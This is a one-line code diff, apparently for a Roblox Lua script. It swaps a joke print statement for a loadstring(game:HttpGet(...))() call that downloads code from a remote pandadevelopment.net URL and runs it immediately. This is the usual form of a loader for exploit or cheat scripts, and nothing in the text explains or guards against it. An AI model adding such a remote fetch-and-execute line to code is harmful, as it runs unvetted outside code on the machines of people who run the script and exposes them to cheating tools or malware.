@@ -1,1 +1,1 @@
-print("skid bro")
+loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/554d3b0704354a28"))()
